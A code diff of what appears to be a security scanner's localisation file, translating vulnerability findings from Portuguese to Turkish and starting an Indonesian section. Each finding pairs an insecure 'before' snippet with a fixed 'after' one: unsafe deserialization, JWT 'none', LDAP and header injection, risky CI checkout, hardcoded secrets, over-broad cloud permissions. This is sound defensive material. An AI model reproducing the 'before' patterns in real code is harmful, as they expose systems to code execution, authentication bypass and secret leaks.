+      '"pull_request_target" kullanılıyor — alakasız bir fork\'tan açılan bir pull request için bile ana deponun izin ve sırlarıyla çalışır — ve ana branch yerine pull request\'in kendi kodunu ("github.event.pull_request.head") checkout ediyor. Pull request\'i açan kişi, o sırlara erişimle kendi kodunu çalıştırmış oluyor.',
     fix: {
       before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
-      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Faz checkout do branch base, não do código da PR — ou use\n      # "pull_request" em vez de "pull_request_target" se não precisar\n      # das permissões/segredos mais amplos.\n      - uses: actions/checkout@v4`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # PR'ın kodunu değil, ana branch'i checkout eder — ya da daha geniş\n      # izinler/sırlar gerekmiyorsa "pull_request_target" yerine\n      # "pull_request" kullanın.\n      - uses: actions/checkout@v4`,
     },
   },
   "insecure-deserialization": {
-    title: "Os dados do pedido são desserializados com um formato que pode executar código",
+    title: "İstek verisi kod çalıştırabilen bir formatla deserialize ediliyor",
     description:
-      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) ou a biblioteca node-serialize (Node) estão a desserializar um valor retirado diretamente do pedido. Ao contrário do JSON, estes formatos podem representar e executar código durante a própria desserialização — quem controlar o valor enviado pode conseguir execução de código arbitrário no servidor.",
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) veya node-serialize kütüphanesi (Node), istekten doğrudan alınan bir değeri deserialize ediyor. JSON'ın aksine, bu formatlar deserialization sırasında kodu temsil edip çalıştırabilir — gönderilen değeri kontrol eden kişi sunucuda rastgele kod çalıştırabilir.",
     fix: {
       before: `data = pickle.loads(request.data)`,
-      after: `import json\ndata = json.loads(request.data)  # o JSON nunca executa código ao fazer parsing, ao contrário do pickle`,
+      after: `import json\ndata = json.loads(request.data)  # JSON, pickle'ın aksine, ayrıştırma sırasında asla kod çalıştırmaz`,
     },
   },
   "jwt-none-algorithm": {
-    title: 'O código aceita explicitamente tokens JWT não assinados (algoritmo "none")',
+    title: "Kod, imzasız JWT tokenlarını (\"none\" algoritması) açıkça kabul ediyor",
     description:
-      '"none" aparece entre os algoritmos aceites para verificar um token JWT. Um token com o algoritmo "none" não tem nenhuma assinatura para verificar: qualquer pessoa pode construir um com qualquer conteúdo (ex. um papel de administrador) e o código aceitá-lo-ia como válido.',
+      "Bir JWT tokenını doğrulamak için kabul edilen algoritmalar arasında \"none\" var. \"none\" algoritmalı bir tokenın doğrulanacak hiçbir imzası yoktur: herkes istediği içerikle (örn. bir yönetici rolü) bir tane oluşturabilir ve kod onu geçerli kabul eder.",
     fix: {
       before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
-      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nunca incluir "none" entre os algoritmos aceites`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // kabul edilen algoritmalar arasına asla "none" eklemeyin`,
     },
   },
   "terraform-s3-block-public-access-disabled": {
-    title: "O Block Public Access está desativado num bucket S3 definido em Terraform",
+    title: "Terraform'da tanımlı bir S3 bucket'ında Block Public Access devre dışı",
     description:
-      'Uma ou mais das quatro proteções de "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) estão definidas como false. Não significa que o bucket já seja público, mas remove uma rede de segurança que impediria torná-lo público por engano no futuro.',
+      "\"aws_s3_bucket_public_access_block\"ın dört korumasından (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) biri veya birkaçı false olarak ayarlanmış. Bu, bucket'ın zaten herkese açık olduğu anlamına gelmez, ama ileride yanlışlıkla herkese açık hale getirilmesini önleyecek bir güvenlik ağını kaldırır.",
     fix: {
       before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
       after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
     },
   },
   "terraform-iam-wildcard-policy": {
-    title: "Uma policy IAM definida em Terraform concede acesso completo",
+    title: "Terraform'da tanımlı bir IAM policy'si tam erişim veriyor",
     description:
-      'Um statement com action "*" e resource "*" concede acesso completo a todos os serviços e recursos da AWS — a mesma verificação já feita no estado IAM em tempo real, aqui lida diretamente a partir do código antes mesmo de ser aplicada. Pode ser intencional para um papel de emergência, mas deve ser confirmado: para uso diário, conceda apenas as permissões realmente necessárias.',
+      "Eylemi \"*\" ve kaynağı \"*\" olan bir statement, her AWS servisine ve kaynağına tam erişim veriyor — henüz uygulanmadan doğrudan koddan okunan, canlı IAM state'inde zaten yapılan aynı kontrol. Acil durum rolü için kasıtlı olabilir, ama doğrulanmalı: günlük kullanım için yalnızca gerçekten gereken izinleri verin.",
     fix: {
       before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
-      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::o-seu-bucket/*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
     },
   },
   "gcp-storage-bucket-public": {
-    title: "Um bucket do Google Cloud Storage é tornado legível por qualquer pessoa",
+    title: "Bir Google Cloud Storage bucket'ı herkes tarafından okunabilir hale getirilmiş",
     description:
-      'Um recurso "google_storage_bucket_iam_member" ou "google_storage_bucket_iam_binding" concede um papel a "allUsers" ou "allAuthenticatedUsers" — o primeiro torna o bucket legível por qualquer pessoa na internet, mesmo sem conta Google; o segundo por qualquer pessoa com uma conta Google qualquer, não só quem devia ter acesso.',
+      "Bir \"google_storage_bucket_iam_member\" veya \"google_storage_bucket_iam_binding\" kaynağı, \"allUsers\" veya \"allAuthenticatedUsers\"a bir rol veriyor — ilki bucket'ı Google hesabı olmayan herkes de dahil internetteki herkes tarafından okunabilir yapar; ikincisi, erişimi olması gerekenlerle sınırlı kalmadan herhangi bir Google hesabına sahip herkese açar.",
     fix: {
       before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
-      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:alguem@example.com"  # apenas quem deve mesmo ter acesso, não allUsers/allAuthenticatedUsers\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # yalnızca gerçekten erişmesi gerekenler, allUsers/allAuthenticatedUsers değil\n}`,
     },
   },
   "azure-storage-public-access": {
-    title: "O acesso público a blobs está ativado numa conta de armazenamento Azure",
+    title: "Bir Azure storage account'ında herkese açık blob erişimi etkin",
     description:
-      '"allow_blob_public_access" está definido como true numa "azurerm_storage_account": qualquer pessoa que conheça o URL de um blob/contentor tornado público pode lê-lo, sem nenhuma autenticação.',
+      "\"allow_blob_public_access\", bir \"azurerm_storage_account\" üzerinde true olarak ayarlanmış: herkese açık hale getirilmiş bir blob/container'ın URL'sini bilen herkes, hiçbir kimlik doğrulama olmadan onu okuyabilir.",
     fix: {
       before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
       after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
     },
   },
   "gcp-iam-overly-broad-role": {
-    title: "Um papel IAM do Google Cloud concede acesso completo (Owner/Editor)",
+    title: "Bir Google Cloud IAM rolü tam erişim veriyor (Owner/Editor)",
     description:
-      'Um "google_project_iam_binding"/"google_project_iam_member" (ou o equivalente ao nível da organização/pasta) atribui o papel primitivo "roles/owner" ou "roles/editor" — acesso quase completo a todos os serviços do projeto. Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para uso diário, conceda apenas os papéis predefinidos mais específicos que sejam realmente necessários.',
+      "Bir \"google_project_iam_binding\"/\"google_project_iam_member\" (veya organizasyon/klasör düzeyindeki eşdeğeri), \"roles/owner\" veya \"roles/editor\" temel rolünü atıyor — projedeki her servise neredeyse tam erişim. Acil durum hesabı için kasıtlı olabilir, ama doğrulanmalı: günlük kullanım için yalnızca gerçekten gereken, daha özel önceden tanımlı rolleri verin.",
     fix: {
       before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
-      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # apenas o papel predefinido realmente necessário, não roles/owner\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # yalnızca gerçekten gereken önceden tanımlı rol, roles/owner değil\n  member  = "user:dev@example.com"\n}`,
     },
   },
   "azure-role-assignment-owner": {
-    title: "Uma atribuição de papel Azure concede acesso completo (Owner)",
+    title: "Bir Azure rol ataması tam erişim veriyor (Owner)",
     description:
-      'Uma "azurerm_role_assignment" atribui o papel "Owner" — acesso completo, incluindo controlo sobre as permissões de outros utilizadores, em todo o âmbito atribuído (subscrição, grupo de recursos...). Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para uso diário, conceda apenas o papel mais específico realmente necessário (ex. "Contributor" num único grupo de recursos).',
+      "Bir \"azurerm_role_assignment\", atanan tüm kapsam (subscription, resource group...) üzerinde \"Owner\" rolünü atıyor — diğer kullanıcıların izinleri üzerindeki kontrol dahil tam erişim. Acil durum hesabı için kasıtlı olabilir, ama doğrulanmalı: günlük kullanım için yalnızca gerçekten gereken daha özel rolü verin (örn. tek bir resource group üzerinde \"Contributor\").",
     fix: {
       before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
-      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # apenas o papel mais específico realmente necessário, não Owner em toda a subscrição\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # yalnızca gerçekten gereken daha özel rol, tüm subscription üzerinde Owner değil\n}`,
     },
   },
   "weak-random-token": {
-    title: "Um token de segurança é gerado com um gerador de números aleatórios não seguro",
+    title: "Bir güvenlik tokenı kriptografik olarak güvenli olmayan bir rastgele sayı üretici ile oluşturuluyor",
     description:
-      "Um valor com um nome do tipo token/session/reset/otp/csrf é gerado com Math.random() (JS), random.random() (Python) ou rand() (PHP) — geradores não concebidos para segurança, cujas sequências são previsíveis. Um token gerado assim pode ser adivinhado ou reconstruído, anulando o propósito para o qual existe (ex. um link de reposição de palavra-passe que qualquer pessoa poderia prever).",
+      "token/session/reset/otp/csrf gibi bir isme sahip bir değer, Math.random() (JS), random.random() (Python) veya rand() (PHP) ile oluşturuluyor — güvenlik için tasarlanmamış, dizileri tahmin edilebilir üreticiler. Bu şekilde oluşturulan bir token tahmin edilebilir veya yeniden oluşturulabilir, var olma amacını boşa çıkarır (örn. herkesin tahmin edebileceği bir şifre sıfırlama linki).",
     fix: {
       before: `const resetToken = Math.random().toString(36).slice(2);`,
-      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, não Math.random — imprevisível`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, Math.random değil — tahmin edilemez`,
     },
   },
   "ldap-injection": {
-    title: "Um filtro LDAP é construído concatenando diretamente um valor do pedido",
+    title: "Bir LDAP filtresi, bir istek değerini doğrudan birleştirerek oluşturuluyor",
     description:
-      'Uma linha que constrói um filtro LDAP (ex. "(uid=...)") inclui diretamente um valor retirado do pedido, sem nenhum escape dos caracteres especiais do LDAP. Quem controlar esse valor pode alterar a lógica do filtro — por exemplo contornar uma verificação de autenticação ou ler dados do diretório que não devia ver.',
+      "Bir LDAP filtresi oluşturan satır (örn. \"(uid=...)\"), LDAP özel karakterlerinin hiçbir escape işlemi yapılmadan istekten alınan bir değeri doğrudan içeriyor. Bu değeri kontrol eden kişi filtrenin mantığını değiştirebilir — örneğin bir kimlik doğrulama kontrolünü atlayarak veya görmemesi gereken dizin verilerini okuyarak.",
     fix: {
-      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
-      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // os caracteres especiais do LDAP devem ser sempre escapados antes de os usar num filtro\nclient.search(base, { filter });`,
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // bir filtrede kullanmadan önce LDAP özel karakterleri her zaman escape edilmeli\nclient.search(base, { filter });",
     },
   },
   "header-injection": {
-    title: "Um valor do pedido acaba diretamente num cabeçalho de resposta HTTP",
+    title: "Bir istek değeri doğrudan bir HTTP yanıt başlığına giriyor",
     description:
-      "Um cabeçalho de resposta HTTP é definido com um valor retirado diretamente do pedido (query, body, params), sem verificar que não contém uma quebra de linha (CRLF). Um atacante pode inserir cabeçalhos adicionais ou até uma resposta inteiramente diferente — response splitting — podendo manipular cache, cookies ou o conteúdo mostrado a outros utilizadores.",
+      "Bir HTTP yanıt başlığı, satır sonu (CRLF) içermediğini kontrol etmeden doğrudan istekten (query, body, params) alınan bir değerle ayarlanıyor. Bir saldırgan ek başlıklar, hatta tamamen farklı bir yanıt ekleyebilir — response splitting — önbelleği, çerezleri veya diğer kullanıcılara gösterilen içeriği manipüle edebilir.",
     fix: {
       before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
       after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
     },
   },
-  "gha-unpinned-action": {
-    title: "Uma ação de terceiros na CI não está fixada numa versão precisa (commit SHA)",
-    description:
-      'O workflow usa uma ação de terceiros referenciada por tag ou branch (ex. "@v1", "@main") em vez de por commit SHA. Quem a mantém — ou quem comprometer a sua conta — pode mover essa referência para um commit diferente a qualquer momento, mudando silenciosamente o que corre na CI, com acesso aos seus segredos. Um commit SHA aponta sempre para exatamente o mesmo código.',
-    fix: {
-      before: `uses: some-org/some-action@v1`,
-      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, fixado no commit SHA — atualize o SHA quando atualizar a versão`,
-    },
-  },
-  "gha-excessive-permissions": {
-    title: "O workflow concede-se todas as permissões do token em vez de apenas as que usa",
-    description:
-      '"permissions: write-all" concede ao GITHUB_TOKEN do workflow acesso de escrita a tudo — issues, pull requests, pacotes, deployments — mesmo que o workflow só use uma parte. Se um passo do workflow for comprometido (uma dependência maliciosa, um script injetado), essas permissões mais amplas aumentam o que quem o explora pode fazer.',
-    fix: {
-      before: `permissions: write-all`,
-      after: `permissions:\n  contents: read\n  pull-requests: write  # apenas as permissões que o workflow realmente usa`,
-    },
-  },
-  "insecure-cookie-flags": {
-    title: "Um cookie de sessão ou autenticação é definido sem as flags Secure e HttpOnly",
-    description:
-      'Um cookie com um nome parecido com session/auth/token é definido sem "httpOnly" e "secure" entre as suas opções. Sem httpOnly, o JavaScript da página — incluindo código injetado via XSS — pode ler esse cookie. Sem secure, também pode ser enviado numa ligação HTTP não cifrada.',
-    fix: {
-      before: `res.cookie("session", sessionId)`,
-      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
-    },
-  },
-  "docker-hardcoded-secret": {
-    title: "Um segredo é escrito diretamente numa instrução ENV ou ARG do Dockerfile",
-    description:
-      "Uma variável com um nome do tipo password/secret/token/key tem um valor literal numa instrução ENV ou ARG. Ao contrário de um ficheiro .env (que normalmente não acaba na imagem), este valor fica gravado na própria imagem Docker — quem a puder fazer pull ou inspecionar o histórico das layers consegue recuperá-lo, mesmo que a linha seja removida numa versão posterior do Dockerfile.",
-    fix: {
-      before: `ENV DB_PASSWORD=supersecret123`,
-      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passado com: docker build --build-arg DB_PASSWORD=*** (ou, melhor ainda,\n# um BuildKit secret mount, que nunca acaba no histórico das layers)`,
-    },
-  },
   "docker-missing-user": {
-    title: "O Dockerfile não define um utilizador não-root",
+    title: "Dockerfile root olmayan bir kullanıcı ayarlamıyor",
     description:
-      "Nenhuma instrução USER no Dockerfile: sem ela, o contentor corre como root. Se um atacante conseguir executar código dentro do contentor (ex. explorando uma biblioteca vulnerável), ser root dentro do contentor facilita uma fuga para o host — ou um impacto mais amplo no sistema envolvente.",
+      "Dockerfile'da USER talimatı yok: biri olmadan, container root olarak çalışır. Bir saldırgan container içinde kod çalıştırmayı başarırsa (örn. güvenlik açığı olan bir kütüphaneyi istismar ederek), container içinde root olmak host'a kaçışı — veya çevredeki sistem üzerinde daha geniş bir etkiyi — kolaylaştırır.",
     fix: {
       before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
       after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
     },
   },
-  "docker-unpinned-base-image": {
-    title: 'A imagem base do Dockerfile usa a tag ":latest"',
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes manifest'i root olmayan bir kullanıcı olarak çalışmayı açıkça zorunlu kılmıyor",
     description:
-      'Uma instrução FROM usa explicitamente a tag ":latest" em vez de uma versão precisa. "latest" muda ao longo do tempo: o mesmo build, refeito noutro momento, pode obter uma versão diferente da imagem base — um build não reprodutível, e uma atualização indesejada pode chegar sem que ninguém tenha decidido que deveria acontecer.',
+      "Manifest'in hiçbir yerinde (ne pod ne de container düzeyinde) \"runAsNonRoot\" yok: ayarlanmazsa, bir container image'ının tanımladığı kullanıcı olarak çalışır — image bunu değiştirmediyse genellikle varsayılan olarak root. Açıkça true'ya ayarlamak, image hâlâ root olarak çalışmaya çalışırsa pod'un sadece bir olaydan sonra öğrenmek yerine başlamayı başaramamasını sağlar.",
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "Üçüncü taraf bir CI aksiyonu kesin bir sürüme (commit SHA) sabitlenmemiş",
+    description:
+      "Workflow, commit SHA yerine tag veya branch ile (örn. \"@v1\", \"@main\") referans verilen üçüncü taraf bir aksiyon kullanıyor. Onu bakımını yapan kişi — veya hesabını ele geçiren biri — o referansı istediği zaman farklı bir commit'e taşıyabilir, CI'da çalışanı sessizce değiştirebilir ve onun sırlarına erişebilir. Bir commit SHA her zaman tam olarak aynı koda işaret eder.",
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, commit SHA'ya sabitlendi — sürümü güncellediğinizde SHA'yı da güncelleyin`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflow, yalnızca kullandıklarını değil, tokenın tüm izinlerini kendine veriyor",
+    description:
+      "\"permissions: write-all\", workflow sadece bir kısmını kullansa bile workflow'un GITHUB_TOKEN'ına her şeye — issue'lar, pull request'ler, paketler, deployment'lar — yazma erişimi veriyor. Workflow'daki bir adım ele geçirilirse (kötü niyetli bir bağımlılık, enjekte edilmiş bir script), bu daha geniş izinler onu istismar edenin yapabileceklerini artırır.",
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # yalnızca workflow'un gerçekten kullandığı izinler`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "Bir session veya kimlik doğrulama çerezi Secure ve HttpOnly bayrakları olmadan ayarlanmış",
+    description:
+      "session/auth/token'a benzeyen bir isme sahip bir çerez, seçenekleri arasında \"httpOnly\" ve \"secure\" olmadan ayarlanıyor. httpOnly olmadan, sayfadaki herhangi bir JavaScript — XSS ile enjekte edilen kod dahil — bu çerezi okuyabilir. secure olmadan, şifrelenmemiş bir HTTP bağlantısı üzerinden de gönderilebilir.",
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: "Dockerfile'ın base image'ı \":latest\" etiketini kullanıyor",
+    description:
+      "Bir FROM talimatı, kesin bir sürüm yerine açıkça \":latest\" etiketini kullanıyor. \"latest\" zamanla değişir: aynı build, farklı bir zamanda tekrar yapıldığında base image'ın farklı bir sürümünü alabilir — tekrarlanabilir olmayan bir build, ve istenmeyen bir güncelleme kimse buna karar vermeden gelebilir.",
     fix: {
       before: `FROM node:latest`,
       after: `FROM node:20.11-slim`,
     },
   },
   "docker-add-remote-url": {
-    title: "O Dockerfile descarrega um ficheiro remoto com ADD em vez de COPY",
+    title: "Dockerfile, COPY yerine ADD ile uzak bir dosya indiriyor",
     description:
-      "Uma instrução ADD com um URL http/https descarrega um ficheiro da internet durante o build, sem verificação de integridade e com o conteúdo invisível no repositório. Se esse URL alguma vez for comprometido, o build recebe conteúdo arbitrário sem que ninguém repare apenas lendo o Dockerfile.",
+      "http/https URL'li bir ADD talimatı, build sırasında internetten bir dosya indiriyor, hiçbir bütünlük kontrolü olmadan ve içerik depoda görünmüyor. O URL bir gün ele geçirilirse, build hiç kimse Dockerfile'ı okuyarak fark etmeden rastgele içerik çeker.",
     fix: {
       before: `ADD https://example.com/install.sh /tmp/install.sh`,
-      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash esperado>  /tmp/install.sh" | sha256sum -c -`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Dockerfile'da bir ENV veya ARG talimatına doğrudan bir sır yazılmış",
+    description:
+      "password/secret/token/key gibi bir isme sahip değişkenin bir ENV veya ARG talimatında sabit bir değeri var. Normalde image'a girmeyen bir .env dosyasının aksine, bu değer doğrudan Docker image'ının içine gömülür — onu çekebilen veya katman geçmişini inceleyebilen herkes, satır Dockerfile'ın sonraki bir sürümünde kaldırılsa bile onu geri alabilir.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# şöyle geçirilir: docker build --build-arg DB_PASSWORD=*** (ya da daha iyisi,\n# katman geçmişine hiç girmeyen bir BuildKit secret mount)`,
     },
   },
   "k8s-privileged-container": {
-    title: "Um contentor no manifesto Kubernetes corre em modo privilegiado",
+    title: "Kubernetes manifest'indeki bir container ayrıcalıklı olarak çalışıyor",
     description:
-      '"privileged: true" no securityContext de um contentor desativa quase todo o isolamento habitual entre contentor e host: o contentor pode aceder aos dispositivos do host, alterar a sua configuração de rede, e em muitos casos obter efetivamente acesso root à máquina que o executa. Quase nunca é necessário para uma aplicação normal.',
+      "Bir container'ın securityContext'inde \"privileged: true\", container ile host arasındaki olağan izolasyonun neredeyse tamamını devre dışı bırakır: container host'un cihazlarına erişebilir, ağ yapılandırmasını değiştirebilir ve çoğu durumda onu çalıştıran makinede fiilen root erişimi kazanır. Normal bir uygulama için neredeyse hiç gerekmez.",
     fix: {
       before: `securityContext:\n  privileged: true`,
-      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # apenas as capabilities realmente necessárias`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # yalnızca gerçekten gereken capability'ler`,
     },
   },
   "k8s-plaintext-secret-env": {
-    title: "Um segredo é escrito em texto simples numa variável de ambiente de um manifesto Kubernetes",
+    title: "Bir Kubernetes manifest'inin env değişkeninde bir sır açık metin olarak yazılmış",
     description:
-      'Uma variável de ambiente com um nome do tipo password/secret/token/key tem um valor literal ("value:") em vez de ser lida a partir de um Secret ("valueFrom.secretKeyRef"). O próprio manifesto — muitas vezes submetido a um repositório — contém assim o segredo em texto simples, visível até por alguém que só possa ler a configuração, sem necessariamente executar comandos no cluster.',
+      "password/secret/token/key gibi bir isme sahip bir ortam değişkeni, bir Secret'tan (\"valueFrom.secretKeyRef\") okunmak yerine sabit bir değere (\"value:\") sahip. Genellikle bir depoya commit edilen manifest'in kendisi, bu yüzden sırrı açık metin olarak içerir — bu, cluster'da komut çalıştırmasa bile sadece yapılandırmayı okuyabilen birine bile görünür.",
     fix: {
       before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
       after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
     },
   },
   "k8s-run-as-root": {
-    title: "Um contentor no manifesto Kubernetes está definido para correr como root",
+    title: "Kubernetes manifest'indeki bir container root olarak çalışacak şekilde ayarlanmış",
     description:
-      '"runAsUser: 0" ou "runAsNonRoot: false" no securityContext forçam explicitamente o contentor a correr como root. Se um atacante conseguir executar código dentro do contentor (ex. explorando uma biblioteca vulnerável), ser root dentro do contentor facilita uma fuga para o host — ou um impacto mais amplo.',
+      "securityContext'te \"runAsUser: 0\" veya \"runAsNonRoot: false\", container'ı açıkça root olarak çalışmaya zorlar. Bir saldırgan container içinde kod çalıştırmayı başarırsa (örn. güvenlik açığı olan bir kütüphaneyi istismar ederek), container içinde root olmak host'a kaçışı — veya daha geniş bir etkiyi — kolaylaştırır.",
     fix: {
       before: `securityContext:\n  runAsUser: 0`,
       after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
     },
   },
   "k8s-privilege-escalation": {
-    title: "Um contentor no manifesto Kubernetes pode obter mais privilégios do que tinha ao iniciar",
+    title: "Kubernetes manifest'indeki bir container başladığından daha fazla ayrıcalık kazanabilir",
     description:
-      '"allowPrivilegeEscalation: true" no securityContext permite que um processo dentro do contentor obtenha mais privilégios do que o processo que o iniciou (ex. através de um binário setuid). Combinado com uma vulnerabilidade na aplicação, é mais um passo em direção à execução de código com mais privilégios do que o pretendido.',
+      "securityContext'te \"allowPrivilegeEscalation: true\", container içindeki bir sürecin, onu başlatan süreçten daha fazla ayrıcalık kazanmasına izin verir (örn. bir setuid binary aracılığıyla). Uygulamadaki bir güvenlik açığıyla birleştiğinde, amaçlanandan daha fazla ayrıcalıkla kod çalıştırmaya doğru bir adım daha olur.",
     fix: {
       before: `securityContext:\n  allowPrivilegeEscalation: true`,
       after: `securityContext:\n  allowPrivilegeEscalation: false`,
     },
   },
   "k8s-host-namespace-access": {
-    title: "Um pod no manifesto Kubernetes partilha a rede, os processos ou a memória partilhada do host",
+    title: "Kubernetes manifest'indeki bir pod, host'un ağını, süreçlerini veya paylaşılan belleğini paylaşıyor",
     description:
-      '"hostNetwork", "hostPID" ou "hostIPC" definidos como true tiram o pod do seu isolamento normal: hostNetwork expõe o pod na rede do host (contornando as network policies do cluster), hostPID dá-lhe visibilidade sobre todos os processos da máquina host, hostIPC dá-lhe acesso à memória partilhada do host. Quase nunca é necessário para uma aplicação normal — normalmente só para ferramentas de sistema/monitorização de baixo nível.',
+      "true olarak ayarlanmış \"hostNetwork\", \"hostPID\" veya \"hostIPC\", pod'u normal izolasyonundan çıkarır: hostNetwork pod'u host'un ağında açığa çıkarır (cluster'ın ağ politikalarını atlayarak), hostPID ona host makinedeki her sürece görünürlük verir, hostIPC ona host'un paylaşılan belleğine erişim verir. Normal bir uygulama için neredeyse hiç gerekmez — genellikle yalnızca düşük seviyeli sistem/izleme araçları için.",
     fix: {
       before: `spec:\n  hostNetwork: true`,
       after: `spec:\n  hostNetwork: false`,
     },
   },
-  "k8s-missing-run-as-non-root": {
-    title: "O manifesto Kubernetes não impõe explicitamente a execução com um utilizador não-root",
-    description:
-      'Nenhum "runAsNonRoot" em nenhum lugar do manifesto (nem ao nível do pod nem do contentor): sem o definir, um contentor corre com o utilizador que a sua imagem definir — muitas vezes root por omissão, se a própria imagem não tiver alterado isso. Defini-lo explicitamente como true faz o pod falhar ao iniciar se a imagem ainda tentar correr como root, em vez de só se descobrir depois de um incidente.',
-    fix: {
-      before: `containers:\n  - name: app\n    image: myapp:1.0`,
-      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
-    },
-  },
   "vulnerable-dependency": (original) => ({
-    title: original.title.replace("Dipendenza vulnerabile:", "Dependência vulnerável:"),
+    title: original.title.replace("Dipendenza vulnerabile:", "Güvenlik açığı olan bağımlılık:"),
     description: original.description,
     fix: {
       before: original.fix.before,
       after: original.fix.after.replace(
         "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
-        "Ainda não é conhecida nenhuma versão corrigida — considere um pacote alternativo ou acompanhe as atualizações do projeto."
+        "Henüz bilinen düzeltilmiş bir sürüm yok — alternatif bir paket değerlendirin veya projenin güncellemelerini takip edin."
       ),
     },
   }),
+},
+  id: {
+  "supabase-service-role-in-client": {
+    title: "Kunci rahasia Supabase berakhir di bagian yang dimaksudkan untuk browser",
+    description:
+      "Variabel dengan prefiks publik (mis. NEXT_PUBLIC_, VITE_) atau file sisi klien merujuk ke service role key Supabase. Kunci ini melewati Row Level Security: jika berakhir di bundle browser, siapa pun bisa membacanya dan bertindak sebagai administrator database.",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (hanya server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
